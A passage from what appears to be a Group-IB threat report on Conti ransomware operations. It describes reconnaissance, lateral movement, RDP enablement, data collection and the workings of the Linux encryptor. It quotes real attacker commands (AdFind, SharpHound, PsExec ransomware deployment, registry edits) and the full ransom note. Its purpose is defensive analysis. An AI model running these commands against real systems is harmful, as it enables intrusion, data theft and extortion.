As mentioned above, if the infected device is not in the domain, the attackers ignore it. Once the operators realize that they have found a victim that could be of interest (usually determined by the organization's size and revenue), they scan the network using various tools. Conti's favorite tool seems to be AdFind . In all the incidents that Group-IB experts analyzed, the tool was delivered to the infected device and run as follows:

C:\%AD\_FOLDER\_PATH%\AdFind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName &gt; C:\[domain\_name].csv

Next, the attackers manually download the file for further analysis on their side and remove AdFind.exe and the resulting file. Group-IB experts also noticed that the attackers had a special bat script that launched this tool with different parameters:

```
adfind.exe -f Â«(objectcategory=person)Â» > ad_users.txt adfind.exe -f Â«objectcategory=computerÂ» > ad_computers.txt adfind.exe -f Â«(objectcategory=organizationalUnit)Â» > ad_ous.txt adfind.exe -sc trustdmp > trustdmp.txt adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt adfind.exe -f Â«(objectcategory=group)Â» > ad_group.txt adfind.exe -gcb -sc trustdmp > trustdmp.txt
```

The attackers also use the following tools during reconnaissance:

-  SharpHound , a BloodHound data collection module, is a powerful AD analysis tool that extracts data and presents it as a graph. Example of a launch:

SharpHound.exe --PortScanTimeout 1000 --OutputDirectory C:\Intel --OutputPrefix Â«FULLÂ» --Loop --LoopDuration 00:10:00 --domain %do-main\_name%

<!-- image -->

Similarly to AdFind, the results were moved to a Cobalt Strike 'working directory' and then to the attackers' server for further analysis. The utility and its results were deleted from the infected device.

-  nmap is a freeware utility for IP network scanning
-  Scripts from the PowerSploit project and the PowerView and SharpView tools derived from it. The following scripts have been used in Conti attacks:

## Figure 20.

| SCRIPT                                              | DESCRIPTION                                                                                                    |
|-----------------------------------------------------|----------------------------------------------------------------------------------------------------------------|
| SharpView.exe Find-DomainUserLocation -UserIdentity | Checks which devices in the domain the user is registered on                                                   |
| Find-LocalAdminAccess                               | Helps attackers determine the devices within the domain on which the current user has administrator privileges |
| Invoke-EnumerateLocalAdmin                          | The attackers use this command to obtain a list of local administrators                                        |
| Invoke-ShareFinder                                  | Obtains a list of network drives connected to the device                                                       |

In some cases, when an operation failed, the attackers checked which security solutions were running on the device:

-  wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-  wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
-  wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value

The above commands are usually run when the Cobalt Strike show\_av command is executed. After obtaining this list, the attackers did not take any steps to disable the defenses; they just changed the methods and tools used as part of their attack.

As  mentioned  above,  the  attackers  used Invoke-ShareFinder  CheckShareAccess to obtain information from the network drives to which the infected user had access.

Below is a MITRE table:

## Lateral movement

The attackers moved within the victim's infrastructure in various ways. More often than not, they launched Cobalt Strike beacon instances using the popular PsExec utility. The utility was also used to mass-copy and launch Conti ransomware in organizations.

Example of use:

| COMMAND                                                                                                                                           | DESCRIPTION                                                                                 |
|---------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
| PsExec.exe /accepteula @C:\Intel\cc.txt -u %domain%\Administrator -p %password% cmd /c COPY"\\%server_name%\Intel\update.exe" "C:\ windows\temp\" | Copies the update.exe file to the Temp directory on all devices in the C:\Intel\cc.txt list |
| PsExec -accepteula -d @C:\Intel\1.txt -u %domain%\Administrator -p %password% cmd /c \\%ip%\Intel\c.exe -size 30 -m                               | Launches ransomware on all devices in the C:\Intel\1.txt list from a remote server          |

The abovementioned CVE-2020-1472 (Zerologon) vulnerability, which is described in detail in Exploitation for Privilege Escalation T1068 , is one of the vulnerabilities used for lateral movement.

Lastly, Conti enabled the RDP protocol on some of the infected devices. The hackers probably used RDP to move across the victim's infrastructure. The protocol was enabled as follows:

-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Ðº' /t REG\_ DWORD /v 'fDenyTSConnections' /d 0 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'fSingleSessionPerUser' /d 0 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\ Terminal Server\Licensing Core' /t REG\_DWORD /v 'EnableConcurrentSessions' /d 1 /f
-  REG ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /t REG\_DWORD /v 'EnableConcurrentSessions' /d 1 /f
-  REG ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /t REG\_DWORD /v 'AllowMultipleTSSessions' /d 1 /f
-  REG ADD 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\ Terminal Services' /t REG\_DWORD /v 'MaxInstanceCount' /d 5 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'AllowTSConnections' /d 1 /f

-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'TSAdvertise' /d 1 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'IdleWinStationPoolCount' /d 1 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'TSAppCompat' /d 0 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'TSEnabled' /d 1 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG\_DWORD /v 'TSUserEnabled' /d 0 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\ Terminal Server\WinStations\RDP-Tcp' /t REG\_DWORD /v 'fEnableWinStation' /d 1 /f
-  REG ADD 'HKLM\SYSTEM\CurrentControlSet\Control\ Terminal Server\WinStations\RDP-Tcp' /t REG\_DWORD /v 'MaxInstanceCount' /d 0xffffffff /f
-  REG ADD 'HKLM\SYSTEM\ControlSet001\Control\Terminal Server\ Licensing Core' /t REG\_DWORD /v Â«PolicyAcOff' /d 5 /f
-  sc config termservice start= auto
-  net start termservice /y

This was followed by patching the Terminal Server service with Mimikatz, resulting in multiple RDP sessions being able to run on the patched system at the same time. In some cases, the attackers configured the firewall to enable remote administration:

-  netsh firewall set service remoteadmin enable

To summarize, the following methods are especially important Ð½Ð° techniques can be highlighted:

| TECHNIQUE                                      | DESCRIPTION                                                               |
|------------------------------------------------|---------------------------------------------------------------------------|
| Lateral Tool Transfer T1570                    | Using the PsExec utility for lateral movement                             |
| Exploitation of Remote Service T1210           | Exploiting the Zerologon vulnerability within the victim's infrastructure |
| Remote Services: Remote Desktop Protocol T1021 | Enabling RDP and its further use                                          |

## Collection

During the reconnaissance and 'admin hunting' phase, the attackers download data manually. Interestingly, the instructions describe how data can be downloaded automatically from the victim's infrastructure.

## Archive Collected Data T1560

Running some commands and utilities such as BloodHound creates an archive that the attackers download manually after the utility has run. The archive is also manually deleted from the compromised device.

## Data from Local System T1005

As stated above, the attackers accessed devices on the organization's network and manually downloaded documents from the compromised devices. They were primarily interested in any files that could potentially contain passwords (even password manager databases, which were subsequently brute-forced by the attackers). Moreover, the threat actors prioritized the following types of documents:

-  Financial and accounting documents
-  IT documents
-  Customer information
-  Information about projects
-  Employee details

## Data from Network Shared Drive T1039

Similar to Data from Local System T1005

## Command and Control

Given that Conti mainly used the Cobalt Strike framework, most of the traffic between the compromised organization and C2 passed through HTTPS, while traffic between beacons in the victim's infrastructure passed through SMB. On rare occasions, the threat actors used Cobalt Strike's built-in DNS tunneling functionality to hide traffic. To this end, three techniques were used: Application Layer Protocol: Web Protocols T1071.001, Remote Services: SMB/Windows Admin Shares T1021.002, and Application Layer Protocol: DNS T1071.004. The PsExec utility, which can use the SMB protocol to redirect the input and output data of the program being created, was often used for lateral movement. On the infected infrastructure, the attackers activated a proxy service using the standard Cobalt Strike socks command, which points to another technique: Proxy: Internal Proxy T1090.001. Lastly, in some cases, the attackers enabled RDP and conducted malicious activity within the organization's network via this standard protocol, so Remote Access Software T1219 can also be added to the list.

To summarize:

-  Application Layer Protocol: Web Protocols T1071.001
-  Remote Services: SMB/Windows Admin Shares T1021.002
-  Application Layer Protocol: DNS ID: T1071.004
-  Proxy: Internal Proxy T1090.001
-  Remote Access Software T1219

## Impact

Like most ransomware groups, Conti has two goals:

-  Steal as much sensitive internal company data as possible
-  Paralyze the company  by encrypting its infrastructure

For this reason, two techniques are relevant to this section:

| TECHNIQUE                       | DESCRIPTION                                                                                                                                               |
|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|
| Data Destruction T1485          | The first thing that the attackers do is manually delete backup data.                                                                                     |
| Data Encrypted for Impact T1486 | Next, the hackers download ransomware to all the devices they can reach and run it. The pro- cess is described in detail in the Lateral Movement section. |

During their analysis, Group-IB experts found the following ransomware samples:

-  Conti, Windows version
-  Conti, Linux version (a detailed description can be found below)
-  Hive, Linux version

Following a leak of Conti's internal chat logs, an extensive list of other RaaS with which Conti is partnering has been revealed to the world. The use of Hive as part of the ARMattack campaign is therefore unlikely to surprise anyone and there is no point in covering  it.

## Conti ransomware variant for Linux

Group-IB has been monitoring Conti's activities since the group was created. The Linux version of Conti ransomware has already been described in public sources (as the chat logs showed, it proved problematic for the developers and even derailed an important deal). The version Group-IB investigated is slightly different to the one available publicly, so a couple of pages in this report are dedicated to it.

<!-- image -->

Group-IB analysts take particular interest in any new tool, and the Linux version of Conti ransomware of the same name was no exception. Group-IB specialists analyzed a file named linuxx64 ELF , with SHA256: abd011278f60b350e932c6ed3e2ee16b3e0f45d616d04e5d2fba02 a57d521080 .

The Linux version of Conti is capable of handling the following input parameters:

| --path   | Specifies the path to the directory in which the files are to be encrypted                                     |
|----------|----------------------------------------------------------------------------------------------------------------|
| --size   | Controls the size of the blocks for encrypting files and the gaps between them in partial file encryption mode |

| --file       | Is not used                                                                                                                                                                       |
|--------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| --detach     | Runs fork() before running the ransomware on all files so that the ransomware continues to run even after the session of the user who ran the ransomware file has been terminated |
| --log        | Keeps a detailed log in the file specified                                                                                                                                        |
| --prockiller | Terminates processes that are using (blocking) the file to be encrypted before encrypting files                                                                                   |
| --vmlist     | Reads the contents of the specified file with a list of virtual machines to be ignored in "vmkiller"                                                                              |
| --vmkiller   | Reads the contents of the vm-list.txt file with a list of VMware ESXi virtual machines, and terminates each of them with the command esxcli vm process kill --type=hard           |

The --path argument is mandatory here; without it, the ransomware will display an error and quit. Conti uses the CryptoPPP open-source project to encrypt files. The malware contains an RSA public key, which the application loads at runtime using the X509PublicKey class. The key is then used to encrypt crucial (including symmetric key) information unique to each file.

As part of the encryption process, the application recursively goes through the directory specified in the --path argument and processes each file as follows:

1. Ignores previously encrypted files and ransomware readme files.
2. Forcibly terminates processes that operate on the encrypted file.
3. Randomly generates a key using a 32-byte buffer as the key.
4. Generates an initialization vector, which is an 8-byte buffer.
5. If  the current file is a database, Conti fully encrypts it; if not, it is encrypted partially (some blocks of the file remain unencrypted).
6. The ransomware generates a file header containing key information in the following format:

\_conti\_[encryption\_file\_size 8 bytes][random encryption key 32 bytes] [IV 8 bytes][file encryption blocksize]

<!-- image -->

Conti aligns the header to 512 bytes, then encrypts it with the RSA algorithm using the public key embedded in the body.

7. As a result, the encrypted file looks like this: first there is an asymmetrically encrypted header with a symmetric key, followed by a symmetrically encrypted body of the file itself. Very crypto-resistant, isn't it?
8. Adds a .conti extension to the end of the encrypted file.

After encryption, Conti leaves a readme file in each directory with the encrypted files. For example:

All of your files are currently encrypted by CONTI strain As you know (if you don't - just 'google it'), all of the data that has been encrypted by our software cannot be recovered by any means without contacting our team directly If you try to use any additional recovery software - the files might be damaged, so if you are willing to try - try it on the data of the lowest value To make sure that we REALLY CAN get your data back - we offer you to decrypt 2 random files completely free of charge You can contact our team directly for further instructions through our website : TOR VERSION : (you should download and install TOR browser first https://torproject.org) %URL% YOU SHOULD BE AWARE! Just in case, if you try to ignore us. We've downloaded a pack of your internal data and are ready to publish it on out news website if you do not respond. So it will be better for both sides if you contact us as soon as possible ---BEGIN ID--%ID% ---END ID---

As can be seen, the Conti readme file is verbose and states that the victim should not try to decrypt the files with a third-party decryptor as this is bound to end badly. Conti recommends using the least important files if the victim decides to try anyway. The note emphasizes that the files will definitely be decrypted if the victim communicates with Conti. To gain the victim's trust, the attackers first offer to decrypt two random files. The typo 'out' (our) can be found in the concluding paragraph, which contains a typical blackmail threat. The method is called Double Extortion and works as follows: the extortionists threaten to expose the victim's confidential information uploaded to their DLS if the attack is ignored.

Lastly, the ransomware considers a file to be a database if its extension is one from the list below:

```
'.4dd', '.4dl', '.accdb', '.accdc', '.accde', '.accdr', '.accdt', '.accft', '.adb', '.ade', '.adf', '.adp', '.arc', '.ora', '.alf', '.ask', '.btr', '.bdf', '.cat', '.cdb', '.ckp', '.cma', '.cpd', '.dacpac', '.dad', '.dadiagrams', '.daschema', '.db', '.db-shm', '.db-wal', '.db3', '.dbc', '.dbf', '.dbs', '.dbt', '.dbv', '.dbx', '.dcb', '.dct', '.dcx', '.ddl', '.dlis', '.dp1', '.dqy', '.dsk', '.dsn', '.dtsx', '.dxl', '.eco', '.ecx', '.edb', '.epim', '.exb', '.fcd', '.fdb', '.fic', '.fmp', '.fmp12', '.fmpsl', '.fol', '.fp3', '.fp4', '.fp5', '.fp7', '.fpt', '.frm', '.gdb', '.grdb', '.gwi', '.hdb', '.his', '.ib', '.idb', '.ihx', '.itdb', '.itw', '.jet', '.jtx', '.kdb', '.kexi', '.kexic', '.kexis', '.lgc', '.lwx', '.maf', '.maq', '.mar', '.mas', '.mav', '.mdb', '.mdf', '.mpd', '.mrg', '.mud', '.mwb', '.myd', '.ndf', '.nnt', '.nrmlib', '.ns2', '.ns3', '.ns4', '.nsf', '.nv', '.nv2', '.nwdb', '.nyf', '.odb', '.oqy', '.orx', '.owc', '.p96', '.p97', '.pan', '.pdb', '.pdm', '.pnz', '.qry', '.qvd', '.rbf', '.rctd', '.rod', '.rodx', '.rpd', '.rsd', '.sas7bdat', '.sbf', '.scx', '.sdb', '.sdc', '.sdf', '.sis', '.spq', '.sql', '.sqlite', '.sqlite3', '.sqlitedb', '.te', '.temx', '.tmd', '.tps', '.trc', '.trm', '.udb', '.udl', '.usr', '.v12', '.vis', '.vpd', '.vvv', '.wdb', '.wmdb', '.wrk', '.xdb', '.xld', '.xmlff', '.abcddb', '.abs', '.abx', '.accdw', '.adn', '.db2', '.fm5', '.hjt', '.icg', '.icr', '.kdb', '.lut', '.maw', '.mdn', '.mdt'

## CONTI'S MANYHEADED HYDRA: WHY IT IS IMPORTANT TO TRACK THE GROUP'S ACTIVITIES

The purpose of this report is to fill in the gaps in existing research on the tactics, tools and techniques relating to Conti ransomware. Although many security researchers have analyzed Conti attacks and a lot of information has already been leaked online about the group, which could have shut them down, Conti has shown resilience and more information about new victims will undoubtedly appear on the threat actors' DLS in the future.

Conti has built a sustainable and scalable illicit ransomware business from both a technical and managerial standpoint. A large number of experts are involved in the business: programmers, pentesters, system administrators, HR personnel, and team leaders. In short, this hydra has too many heads, and Conti's continuous development as a project will likely make itself heard in one way or another.

Seeing as Conti is dangerous for both businesses and governments, it is crucial that cybersecurity experts are aware of the tactics and methods that the group uses. This is especially true considering that practically any business falls within the scope of the group's interests, given the wide range of industries that the threat actors target. Group-IB will continue to monitor Conti's activities and, as always, keep you informed of any developments.

In the appendices to this report, we provide indicators of compromise and other data to help researchers and cybersecurity experts look for traces of compromise and prevent attacks by Conti.
